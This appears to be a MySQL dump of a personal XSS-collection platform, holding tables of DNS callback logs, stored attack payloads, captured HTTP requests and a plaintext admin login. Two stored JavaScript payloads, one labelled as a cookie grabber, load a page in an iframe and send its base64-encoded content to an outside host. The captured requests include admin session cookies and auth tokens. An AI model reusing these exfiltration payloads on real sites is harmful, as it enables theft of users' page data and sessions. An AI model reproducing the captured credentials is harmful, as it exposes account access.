/*
 Navicat Premium Data Transfer

 Source Server         : 127.0.0.1
 Source Server Type    : MySQL
 Source Server Version : 80013
 Source Host           : localhost:3306
 Source Schema         : node

 Target Server Type    : MySQL
 Target Server Version : 80013
 File Encoding         : 65001

 Date: 18/01/2019 17:01:10
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for dnslogs
-- ----------------------------
DROP TABLE IF EXISTS `dnslogs`;
CREATE TABLE `dnslogs` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `time` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `log` varchar(1000) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `hash` varchar(255) COLLATE utf8mb4_general_ci DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- ----------------------------
-- Records of dnslogs
-- ----------------------------
BEGIN;
INSERT INTO `dnslogs` VALUES (1, '2019-01-18 16:46:13', 'p0desta.explog.ga', 'c4ca4238a0b923820dcc509a6f75849b');
INSERT INTO `dnslogs` VALUES (2, '2019-01-17 20:43:23', 'root.explog.ga', NULL);
COMMIT;

-- ----------------------------
-- Table structure for files
-- ----------------------------
DROP TABLE IF EXISTS `files`;
CREATE TABLE `files` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `filename` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `description` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `code` mediumtext CHARACTER SET utf8 COLLATE utf8_general_ci,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=11 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of files
-- ----------------------------
BEGIN;
INSERT INTO `files` VALUES (1, 'testf', 'xxxx', 'function send(e) {\n    var t = new XMLHttpRequest;\n    t.open(\"POST\", \"https://xss.p0desta.com\", !0), t.setRequestHeader(\"Content-type\", \"text/plain\"), t.onreadystatechange = function() {\n        4 == t.readyState && t.status\n    }, t.send(e)\n}\nvar iframe = document.createElement(\"iframe\");\niframe.src = \"/home/publiclist\";\ndocument.body.appendChild(iframe);\niframe.onload = setInterval(function() {\n    var c = encodeURI(document.getElementsByTagName(\"iframe\")[0].contentWindow.document.getElementsByTagName(\"body\")[0].innerHTML);\n    send(btoa(c));\n}, 2)');
INSERT INTO `files` VALUES (5, 'exp.js', 'exp ', 'var ffff;');
INSERT INTO `files` VALUES (6, 'xxxxmmm', 'xxxmmmmm', 'aaaammmm');
INSERT INTO `files` VALUES (7, 'cookie.js', '打cookie', 'function send(e) {\n    var t = new XMLHttpRequest;\n    t.open(\"POST\", \"https://xxxx.com\", !0), t.setRequestHeader(\"Content-type\", \"text/plain\"), t.onreadystatechange = function() {\n        4 == t.readyState && t.status\n    }, t.send(e)\n}\nvar iframe = document.createElement(\"iframe\");\niframe.src = \"/home/publiclist\";\ndocument.body.appendChild(iframe);\niframe.onload = setInterval(function() {\n    var c = encodeURI(document.getElementsByTagName(\"iframe\")[0].contentWindow.document.getElementsByTagName(\"body\")[0].innerHTML);\n    send(btoa(c));\n}, 2)');
INSERT INTO `files` VALUES (9, 'fff.js', 'fff', 'fff');
INSERT INTO `files` VALUES (10, 'shell.php', 'ccc', '<?php phpinfo();?>');
COMMIT;

-- ----------------------------
-- Table structure for infos
-- ----------------------------
DROP TABLE IF EXISTS `infos`;
CREATE TABLE `infos` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `info` varchar(3000) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM AUTO_INCREMENT=17 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of infos
-- ----------------------------
BEGIN;
INSERT INTO `infos` VALUES (9, '{\"user_ip\":\"127.0.0.1\",\"user_port\":\"25814\",\"protocol\":\"HTTP\\/1.1\",\"request_method\":\"POST\",\"request_uri\":\"\\/personal_xss\\/public\\/?m=123213\",\"request_time\":\"1546317429\",\"headers_data\":{\"upgrade-insecure-requests\":\"1\",\"connection\":\"close\",\"referer\":\"http:\\/\\/www.test.com\\/fiyocms\\/\",\"cookie\":\"think_var=zh-cn\",\"accept-encoding\":\"gzip, deflate\",\"accept-language\":\"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\",\"accept\":\"text\\/html,application\\/xhtml+xml,application\\/xml;q=0.9,*\\/*;q=0.8\",\"user-agent\":\"Mozilla\\/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko\\/20100101 Firefox\\/56.0\",\"host\":\"www.test.com\",\"content-type\":\"application\\/x-www-form-urlencoded\",\"content-length\":\"20\"},\"get_data\":{\"m\":\"123213\"},\"post_data\":{\"flag\":\"dsfdsa\",\"ccc\":\"xxxx\"},\"cookie_data\":{\"think_var\":\"zh-cn\"}}');
INSERT INTO `infos` VALUES (10, '{\"user_ip\":\"127.0.0.1\",\"user_port\":\"26102\",\"protocol\":\"HTTP\\/1.1\",\"request_method\":\"GET\",\"request_uri\":\"\\/personal_xss\\/public\\/?m=123213\",\"request_time\":\"1546318025\",\"headers_data\":{\"upgrade-insecure-requests\":\"1\",\"connection\":\"close\",\"referer\":\"http:\\/\\/www.test.com\\/fiyocms\\/\",\"cookie\":\"think_var=zh-cn\",\"accept-encoding\":\"gzip, deflate\",\"accept-language\":\"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\",\"accept\":\"text\\/html,application\\/xhtml+xml,application\\/xml;q=0.9,*\\/*;q=0.8\",\"user-agent\":\"Mozilla\\/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko\\/20100101 Firefox\\/56.0\",\"host\":\"www.test.com\"},\"get_data\":{\"m\":\"123213\"},\"post_data\":[],\"cookie_data\":{\"think_var\":\"zh-cn\"}}');
INSERT INTO `infos` VALUES (11, '{\"user_ip\":\"127.0.0.1\",\"user_port\":\"26102\",\"protocol\":\"HTTP\\/1.1\",\"request_method\":\"GET\",\"request_uri\":\"\\/personal_xss\\/public\\/?m=123213\",\"request_time\":\"1546318026\",\"headers_data\":{\"upgrade-insecure-requests\":\"1\",\"connection\":\"close\",\"referer\":\"http:\\/\\/www.test.com\\/fiyocms\\/\",\"cookie\":\"think_var=zh-cn\",\"accept-encoding\":\"gzip, deflate\",\"accept-language\":\"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\",\"accept\":\"text\\/html,application\\/xhtml+xml,application\\/xml;q=0.9,*\\/*;q=0.8\",\"user-agent\":\"Mozilla\\/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko\\/20100101 Firefox\\/56.0\",\"host\":\"www.test.com\"},\"get_data\":{\"m\":\"123213\"},\"post_data\":[],\"cookie_data\":{\"think_var\":\"zh-cn\"}}');
INSERT INTO `infos` VALUES (12, '{\"user_ip\":\"127.0.0.1\",\"user_port\":\"25652\",\"protocol\":\"HTTP\\/1.1\",\"request_method\":\"GET\",\"request_uri\":\"\\/\",\"request_time\":\"1546601375\",\"headers_data\":{\"upgrade-insecure-requests\":\"1\",\"connection\":\"close\",\"accept-encoding\":\"gzip, deflate\",\"accept-language\":\"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\",\"accept\":\"text\\/html,application\\/xhtml+xml,application\\/xml;q=0.9,*\\/*;q=0.8\",\"user-agent\":\"Mozilla\\/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko\\/20100101 Firefox\\/56.0\",\"host\":\"www.personal_xss.com\"},\"get_data\":[],\"post_data\":[],\"cookie_data\":[]}');
INSERT INTO `infos` VALUES (6, '{\"user_ip\":\"127.0.0.1\",\"user_port\":\"7996\",\"protocol\":\"HTTP\\/1.1\",\"request_method\":\"GET\",\"request_uri\":\"\\/personal_xss\\/public\\/?a=cccc&amp;x=aa\",\"request_time\":\"1546241423\",\"headers_data\":{\"cookie\":\"po_lang_front=gb; espcms_admin_user_info=L4MD7xAVrRNTUoYtCdAI%2FMbDC5ZPcqwlcGkX%2BLI9CPn1NEgrMnEqE%2F167VhVyZhAI%2FQMuCHw2YDjhkuJzj%2FdrlfeiUena1alQN3Ke4FYcPTm45jL1Ep%2BHRDeArrE881sMi50UgPpR9pOImTpZvb8zwWDgEFSB5BD2NivZEwL81tbxFV2Dp%2F8x9oGniYuiCEoecwi%2BUeBSz36W5aRW76vPvH8RFgf8NjFiIntJWHPgcQibpXYhjqVuVfpb%2Fs0vFKr7Q74EojeHZ1h54qe1CY5Bt0oCHPuaAypPPOKRQgSM8vfPH3WJddTayHM4rcicKq86kD6bofnAIukaJKGnW5bR0AI7Gl24c%2Bqk213rErns8L%2Fw5zS0e5teXMFGIPHS8N4HdWJt7kcUnVviHG4kJ7R1k1JvrUCaMLIkhU46jtJRCUnIEt0nkNYMStJ9vUuhYiXNPZBKCNEz1PTgFGeHmc201v9ktEKxoD7FvJXtt33D2Q%3D; espcms_admin_user_server_info=o%2BWABNNfuAXxOlgSuNcP7YQ20aAJY6k%2BWouD2hwetNZYbhxNwJa4A8OQnmj%2BpdTHAygfXpnQ%2FZXHmHFCb3fLO23QY4caIwut%2FsWbVrneaZA%3D; YPF8827340282Jdskjhfiw_928937459182JAX666=74.120.175.101; _ga=GA1.2.1654026489.1545798250; c0y_auth=6d45HlUcBttkTTU-S-GtRbVJJHHWaLQ0D8qTWebYqECU2YJOu9fmk-P-do0uzAInMy64ydq9G3rkR6fgWN8gZaUbsD6w; c0y_username=admin; think_var=zh-cn\",\"accept-language\":\"zh-CN,zh;q=0.9\",\"accept-encoding\":\"gzip, deflate\",\"accept\":\"text\\/html,application\\/xhtml+xml,application\\/xml;q=0.9,image\\/webp,image\\/apng,*\\/*;q=0.8\",\"user-agent\":\"Mozilla\\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\\/537.36 (KHTML, like Gecko) Chrome\\/71.0.3578.98 Safari\\/537.36\",\"upgrade-insecure-requests\":\"1\",\"connection\":\"close\",\"host\":\"www.test.com\"},\"get_data\":{\"a\":\"cccc\",\"x\":\"aa\"},\"post_data\":[],\"cookie_data\":{\"po_lang_front\":\"gb\",\"espcms_admin_user_info\":\"L4MD7xAVrRNTUoYtCdAI\\/MbDC5ZPcqwlcGkX+LI9CPn1NEgrMnEqE\\/167VhVyZhAI\\/QMuCHw2YDjhkuJzj\\/drlfeiUena1alQN3Ke4FYcPTm45jL1Ep+HRDeArrE881sMi50UgPpR9pOImTpZvb8zwWDgEFSB5BD2NivZEwL81tbxFV2Dp\\/8x9oGniYuiCEoecwi+UeBSz36W5aRW76vPvH8RFgf8NjFiIntJWHPgcQibpXYhjqVuVfpb\\/s0vFKr7Q74EojeHZ1h54qe1CY5Bt0oCHPuaAypPPOKRQgSM8vfPH3WJddTayHM4rcicKq86kD6bofnAIukaJKGnW5bR0AI7Gl24c+qk213rErns8L\\/w5zS0e5teXMFGIPHS8N4HdWJt7kcUnVviHG4kJ7R1k1JvrUCaMLIkhU46jtJRCUnIEt0nkNYMStJ9vUuhYiXNPZBKCNEz1PTgFGeHmc201v9ktEKxoD7FvJXtt33D2Q=\",\"espcms_admin_user_server_info\":\"o+WABNNfuAXxOlgSuNcP7YQ20aAJY6k+WouD2hwetNZYbhxNwJa4A8OQnmj+pdTHAygfXpnQ\\/ZXHmHFCb3fLO23QY4caIwut\\/sWbVrneaZA=\",\"YPF8827340282Jdskjhfiw_928937459182JAX666\":\"74.120.175.101\",\"_ga\":\"GA1.2.1654026489.1545798250\",\"c0y_auth\":\"6d45HlUcBttkTTU-S-GtRbVJJHHWaLQ0D8qTWebYqECU2YJOu9fmk-P-do0uzAInMy64ydq9G3rkR6fgWN8gZaUbsD6w\",\"c0y_username\":\"admin\",\"think_var\":\"zh-cn\"}}');
INSERT INTO `infos` VALUES (8, '{\"user_ip\":\"127.0.0.1\",\"user_port\":\"25806\",\"protocol\":\"HTTP\\/1.1\",\"request_method\":\"POST\",\"request_uri\":\"\\/personal_xss\\/public\\/\",\"request_time\":\"1546317405\",\"headers_data\":{\"upgrade-insecure-requests\":\"1\",\"connection\":\"close\",\"referer\":\"http:\\/\\/www.test.com\\/fiyocms\\/\",\"cookie\":\"think_var=zh-cn\",\"accept-encoding\":\"gzip, deflate\",\"accept-language\":\"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\",\"accept\":\"text\\/html,application\\/xhtml+xml,application\\/xml;q=0.9,*\\/*;q=0.8\",\"user-agent\":\"Mozilla\\/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko\\/20100101 Firefox\\/56.0\",\"host\":\"www.test.com\",\"content-type\":\"application\\/x-www-form-urlencoded\",\"content-length\":\"20\"},\"get_data\":[],\"post_data\":{\"flag\":\"dsfdsa\",\"ccc\":\"xxxx\"},\"cookie_data\":{\"think_var\":\"zh-cn\"}}');
INSERT INTO `infos` VALUES (13, '{\"user_ip\":\"172.22.0.1\",\"user_port\":\"48376\",\"protocol\":\"HTTP\\/1.1\",\"request_method\":\"GET\",\"request_uri\":\"\\/public\\/index.php\\/\",\"request_time\":\"1547638163\",\"headers_data\":{\"host\":\"127.0.0.1:10082\",\"user-agent\":\"Mozilla\\/5.0 (Macintosh; Intel Mac OS X 10.14; rv:64.0) Gecko\\/20100101 Firefox\\/64.0\",\"accept\":\"text\\/html,application\\/xhtml+xml,application\\/xml;q=0.9,*\\/*;q=0.8\",\"accept-language\":\"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\",\"accept-encoding\":\"gzip, deflate\",\"connection\":\"keep-alive\",\"upgrade-insecure-requests\":\"1\"},\"get_data\":[],\"post_data\":[],\"cookie_data\":[]}');
INSERT INTO `infos` VALUES (14, '{\"user_ip\":\"172.22.0.1\",\"user_port\":\"48382\",\"protocol\":\"HTTP\\/1.1\",\"request_method\":\"GET\",\"request_uri\":\"\\/public\\/index.php\\/index\\/index\",\"request_time\":\"1547638194\",\"headers_data\":{\"host\":\"127.0.0.1:10082\",\"user-agent\":\"Mozilla\\/5.0 (Macintosh; Intel Mac OS X 10.14; rv:64.0) Gecko\\/20100101 Firefox\\/64.0\",\"accept\":\"text\\/html,application\\/xhtml+xml,application\\/xml;q=0.9,*\\/*;q=0.8\",\"accept-language\":\"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\",\"accept-encoding\":\"gzip, deflate\",\"connection\":\"keep-alive\",\"cookie\":\"think_var=zh-cn\",\"upgrade-insecure-requests\":\"1\"},\"get_data\":[],\"post_data\":[],\"cookie_data\":{\"think_var\":\"zh-cn\"}}');
INSERT INTO `infos` VALUES (15, '{\"user_ip\":\"172.22.0.1\",\"user_port\":\"50626\",\"protocol\":\"HTTP\\/1.1\",\"request_method\":\"GET\",\"request_uri\":\"\\/public\\/\",\"request_time\":\"1547784507\",\"headers_data\":{\"host\":\"127.0.0.1:10082\",\"user-agent\":\"Mozilla\\/5.0 (Macintosh; Intel Mac OS X 10.14; rv:64.0) Gecko\\/20100101 Firefox\\/64.0\",\"accept\":\"text\\/html,application\\/xhtml+xml,application\\/xml;q=0.9,*\\/*;q=0.8\",\"accept-language\":\"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\",\"accept-encoding\":\"gzip, deflate\",\"referer\":\"http:\\/\\/127.0.0.1:10082\\/public\\/uploads\\/\",\"connection\":\"keep-alive\",\"cookie\":\"PHPSESSID=220ctpnrmjrieq9h87aqhtmo67\",\"upgrade-insecure-requests\":\"1\"},\"get_data\":[],\"post_data\":[],\"cookie_data\":{\"PHPSESSID\":\"220ctpnrmjrieq9h87aqhtmo67\"}}');
INSERT INTO `infos` VALUES (16, '{\"user_ip\":\"172.22.0.1\",\"user_port\":\"50626\",\"protocol\":\"HTTP\\/1.1\",\"request_method\":\"GET\",\"request_uri\":\"\\/public\\/\",\"request_time\":\"1547784512\",\"headers_data\":{\"host\":\"127.0.0.1:10082\",\"user-agent\":\"Mozilla\\/5.0 (Macintosh; Intel Mac OS X 10.14; rv:64.0) Gecko\\/20100101 Firefox\\/64.0\",\"accept\":\"text\\/html,application\\/xhtml+xml,application\\/xml;q=0.9,*\\/*;q=0.8\",\"accept-language\":\"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\",\"accept-encoding\":\"gzip, deflate\",\"connection\":\"keep-alive\",\"cookie\":\"PHPSESSID=220ctpnrmjrieq9h87aqhtmo67\",\"upgrade-insecure-requests\":\"1\"},\"get_data\":[],\"post_data\":[],\"cookie_data\":{\"PHPSESSID\":\"220ctpnrmjrieq9h87aqhtmo67\"}}');
COMMIT;

-- ----------------------------
-- Table structure for users
-- ----------------------------
DROP TABLE IF EXISTS `users`;
CREATE TABLE `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `password` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of users
-- ----------------------------
BEGIN;
INSERT INTO `users` VALUES (1, 'admin', 'admin');
COMMIT;

SET FOREIGN_KEY_CHECKS = 1;
